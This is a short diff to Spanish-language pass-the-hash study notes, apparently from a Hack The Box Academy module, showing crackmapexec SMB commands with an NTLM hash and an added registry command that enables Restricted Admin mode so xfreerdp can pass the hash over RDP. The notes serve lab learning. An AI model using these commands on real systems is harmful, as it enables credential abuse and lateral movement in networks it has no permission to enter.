@@ -31,3 +31,8 @@
 ### Crackmapexec
 `crackmapexec smb TARGET_IP -u USER -H NTHASH`
 `cme smb 192.168.1.10 -u admin -H 0123456789abcdef0123456789abcdef`
+
+## Permitir Pth con RDP
+`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
+- ![](https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png)
+- Una vez de que la llave fue agregada al registro del sistema podemos intntar usar xfreerdp con la opción /pth
